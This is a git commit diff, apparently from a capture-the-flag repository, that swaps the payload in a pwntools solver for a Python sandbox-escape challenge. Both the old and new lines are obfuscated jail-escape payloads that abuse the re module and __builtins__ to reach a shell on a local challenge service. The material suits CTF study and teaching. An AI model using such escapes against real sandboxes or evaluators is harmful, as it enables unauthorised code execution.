ef603c652c4fad2b6df7b17b6a1f68bd888216d9
Jean Tirstan <48832536+st4rn@users.noreply.github.com>
2023-10-10 20:42:05 +0700

    Update solver.py

--- Misc/vampire/solver/solver.py
+++ Misc/vampire/solver/solver.py
@@ -2,5 +2,6 @@ from pwn import *
 
 #p = process('./sandbox.py')
 p = remote("localhost", 23945)
-p.sendline('[[re.A[j]\x0cfor\x0cre.RegexFlag.__getitem__\x0cin\x0c[[re.A[i].system\x0cfor\x0cre.RegexFlag.__getitem__\x0cin\x0c[sys.modules.get]]\x0cfor\x0ci\x0cin\x0c[re.A[re.__doc__[re.DOTALL^re.M^re.T]]\x0cfor\x0cre.RegexFlag.__getitem__\x0cin\x0c[re.__doc__[re.L].__add__]]][re.L^re.L]]\x0cfor\x0cj\x0cin\x0c[re.A[re.__doc__[re.U^re.M]]\x0cfor\x0cre.RegexFlag.__getitem__\x0cin\x0c[re.__doc__[re.DOTALL^re.M^re.T].__add__]]]')
+prompt = '[re.A^[re.A[[]]for re.RegexFlag.__getitem__ in[re.sub.__builtins__[[x for x in re.sub.__builtins__][re.L.value^re.S.value^re.M.value]]]][re.L.value^re.L.value]for re.RegexFlag.__xor__ in[re.sub.__builtins__[[x for x in re.sub.__builtins__][re.L.value^re.S.value]]]]'.replace(' ', '\t')
+p.sendline(prompt)
 p.interactive()
